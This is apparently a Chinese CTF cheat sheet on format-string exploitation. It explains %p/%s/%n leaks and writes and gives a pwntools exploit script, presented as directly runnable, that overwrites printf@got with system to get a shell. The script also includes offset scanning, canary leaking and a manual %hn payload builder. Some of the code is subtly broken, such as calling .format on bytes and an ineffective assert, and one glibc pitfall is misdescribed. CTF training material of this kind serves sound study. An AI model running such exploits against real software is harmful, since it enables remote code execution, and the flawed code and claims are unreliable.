---
title: 格式化字符串任意读写（含 %n 覆盖 GOT）
category: pwn
tags: [格式化字符串, fmtstr, "百分号n任意写", GOT覆盖, 任意写]
signals: [printf(用户输入) 没有格式串, 出现 %p %s %n 被过滤, 程序先打印再读, 栈上有 0x70257025 之类回显, 有 canary 可借此泄露, 需要改 printf@got 为 system]
difficulty: medium
source: "CTF-Wiki Format String / HackTricks Format Strings / pwntools fmtstr"
tools: [pwntools, gdb, pwndbg, IDA]
updated: 2026-10-22
analogous_to: [blockchain/evm-storage-slot.md]
---

## 一、识别信号（题面长什么样）

- 反编译里 `printf(buf)`、`fprintf(stdout, buf)`、`syslog(buf)` 参数直接就是用户输入。
- 输入 `%p.%p.%p` 后程序回显一串十六进制地址，且其中有你自己输入字节的 `0x70257025` 形态。
- 输入 `AAAA%6$p` 返回 `0x41414141` —— 第 6 个参数正是缓冲区，说明可直接寻址。
- 输入 `%s` 程序崩溃（SIGSEGV），说明读到了非法地址，`%s` 可用。
- 题目给 `__stack_chk_fail@got` 或 `printf@got`，且 `checksec` 显示 `Partial RELRO`。

## 二、原理

`printf` 是变参函数，参数从寄存器/栈上按格式串依次取。当格式串可控：

| 说明符 | 作用 | 利用 |
|---|---|---|
| `%p` | 打印参数栈值 | 泄露 canary / 返回地址 / libc 地址 |
| `%s` | 把参数当指针解引用 | 泄露任意地址内容（需先压入地址） |
| `%n` | 把已输出字符数写入参数指针 | **任意地址写**（4 字节） |
| `%hn` | 写 2 字节 | 更精确、更快 |
| `%hhn` | 写 1 字节 | 写 GOT 低位、部分覆盖 |
| `%<n>c` | 输出 n 个字符 | 控制 `%n` 写入值 |

寻址技巧：`%6$p` 表示取第 6 个参数。x86-64 前 6 个整数参数走 `rdi,rsi,rdx,rcx,r8,r9`，**第 7 个之后才在栈上**，所以偏移通常从 6 起算（缓冲区在栈上时常见 `%6$p` ~ `%10$p`）。32 位全部走栈，常见 `%1$p` 起。

字符串地址要**拼在 payload 尾部**，因为 `%6$p` 读的是栈上第 6 个槽，而也没法把地址当立即数传给 `printf`。

## 三、checksec 判读与利用思路

```text
RELRO: Partial RELRO   ← GOT 可写，%n 写 GOT 首选
Canary: found          ← 可用 %p 顺带泄露
NX: enabled
PIE: disabled          ← GOT 地址固定，直接写
```

标准四步：

1. **定位偏移**：`cyclic` 或 `%1$p.%2$p...` 手工扫，或者本地用 pwntools（见下方片段）。
2. **泄露**：`%<idx>$p` 拿 canary / libc；`addr + %<idx>$s` 拿任意地址内容。
3. **写**：`%<idx>$n` 或 `fmtstr_payload(idx, {addr: value})`。
4. **打靶**：最常用是 `printf@got → system`，或 `__stack_chk_fail@got → win`，或 `atoi@got → 0x401234`。

定位缓冲区偏移的片段（Numbered 参数法）：

```python
from pwn import *
p = process("./pwn")
# 一次发 20 个 %<i>$p，看哪个回显你自己输入的 8 个 A
p.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 21)))
out = p.recvline()
for i, frag in enumerate(out.decode(errors="ignore").split("."), start=1):
    if "41414141" in frag.lower():
        print(f"[+] buf 在第 {i} 个参数槽 -> BUF_IDX = {i}")
        break
```

两个关键权衡：
- **写 `%n` 顺序**：从小到大排地址，避免回退；`fmtstr_payload` 自动排序。
- **写入长度**：`%n` 写 4 字节可能耗时数十秒（要输出几十亿字符），**优先 `%hhn`（1 字节 × 4 次）或 `%hn`（2 字节 × 2 次）**。

## 四、可直接运行的 exp 脚本

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn")
context.log_level = "info"

def start():
    return remote(args.HOST or "TARGET", int(args.PORT or 1337)) if args.REMOTE \
           else process()

BUF_IDX = 6               # 实测：输入 "AAAA%6$p" 回显 0x41414141 时取 6

# ---------- 工具 1：自动扫出缓冲区偏移 ----------
def find_offset(p, send, recv, lo=1, hi=40):
    marker = b"ABCDEFGH"
    payload = marker + b".".join(b"%%%d$p" % i for i in range(lo, hi))
    send(payload)
    out = recv()
    needle = hex(u64(marker))[2:-1]
    for i in range(lo, hi):
        if needle in out.decode(errors="ignore").lower():
            return i
    return None

# ---------- 工具 2：泄露任意地址的 8 字节 ----------
def leak(p, send, recv, addr):
    payload = p64(addr) + b"%{}$s".format(BUF_IDX).encode()
    send(payload)
    data = recv()
    return u64(data.split(p64(addr))[-1][:8].ljust(8, b"\x00"))

# ---------- 工具 3：把 printf@got 改成 system，再输入 /bin/sh ----------
def exp_printf2system():
    p = start()
    printf_got = elf.got["printf"]
    # 先把 system 从 libc 里算出来（此处需要之前泄露的 libc base）
    libc = ELF("./libc.so.6", checksec=False)
    libc.address = int(args.BASE or "0", 16)   # 占位：由泄露步骤填入
    system = libc.sym["system"]

    # 用 %hhn 逐字节写，避免 %n 输出过长字符
    payload = fmtstr_payload(BUF_IDX, {printf_got: system}, write_size="byte")
    assert b"\n" not in payload and b"\x00" not in payload[:0]  # readline 场景注意
    p.sendline(payload)
    p.sendline(b"/bin/sh\x00")                  # 下一次 printf("/bin/sh") = system("/bin/sh")
    p.interactive()

# ---------- 工具 4：手写 4 字节垫片（理解 %n 排序用） ----------
def manual_write(idx, targets):
    """
    targets: [(addr, value)]，value 为 1/2/4 字节
    这里演示 2 字节（%hn）写法：先写小值，再写大值
    """
    items = sorted(targets, key=lambda t: t[1] & 0xffff)
    payload = b""
    addr_space = b""
    for addr, val in items:
        payload += p64(addr)
        addr_space += p64(addr)
    parts, printed = [], 0
    for i, (addr, val) in enumerate(items):
        want = val & 0xffff
        delta = (want - printed) & 0xffff
        parts.append(b"%" + str(delta).encode() + b"c%"
                     + str(idx + i).encode() + b"$hn")
        printed = want
    return payload + b"".join(parts)

# ---------- 工具 5：顺带泄露 canary ----------
def leak_canary(p, send, recv):
    # canary 低字节恒为 \x00，取 %p 后手工补回
    p.sendline(("%%%d$p" % (BUF_IDX + 5)).encode())
    val = int(recv().split(b"0x")[-1][:16], 16)
    return p64(val)

if __name__ == "__main__":
    exp_printf2system()
```

本地快速定位缓冲区偏移（不用猜）：

```bash
# 用 pwndbg + 已知 offset 直接验证
python3 -c "import sys; sys.stdout.buffer.write(b'AAAA'+b'%6\$p')" | ./pwn
# 输出里出现 0x41414141 即命中；改用 %7$p 继续试
```

## 五、常见坑 / 变体

- **`%n` 被编译期 `-Wformat-security` 加固**：`printf(buf)` 在 `_FORTIFY_SOURCE` 下仍可控，但部分题目改成 `printf("%s", buf)`，此时该漏洞消失，看别处。
- **`%n` 写入被限制**：glibc 2.30+ 对不可写地址 `%n` 会直接 abort（`*** %n in writable segment detected ***`），地址必须可写，写 GOT 前确认 `Partial RELRO`。
- **字符数超时**：写 `0x7fxxxxxx` 这类大值用 `%n` 要输出 20 亿字符，务必用 `%hhn`。
- **发送后程序崩溃**：多半是 `%s` 读了非法地址——先确认地址可读（`.got.plt`、`.bss`、libc 段）。
- **偏移每次不同**：环境变量长度会改变栈布局！本地复现远程时要 `env -i` 清空环境，或用 `remote` 直接测。
- **`read` 而非 `scanf` 读入**：payload 里的 `\x00` 会被截断，`fmtstr_payload` 生成的是 `p64` 地址含 `\x00`，需要 `send` 而非 `sendline`，或改用 `%hhn` 配合短地址。
- **32 位对齐**：`p32(addr)` 4 字节对齐更好写，`fmtstr_payload(offset, {...}, write_size='byte')` 自动处理。

## 六、参考来源

- [CTF-Wiki: 格式化字符串原理介绍](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)
- [CTF-Wiki: 格式化字符串利用](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/)
- [HackTricks: Format Strings](https://book.hacktricks.wiki/en/binary-exploitation/format-strings/index.html)
- [ir0nstone: Format String Bug](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string)
- [pwntools fmtstr 文档](https://docs.pwntools.com/en/stable/fmtstr.html)
- [ir0nstone: GOT Overwrite](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite)
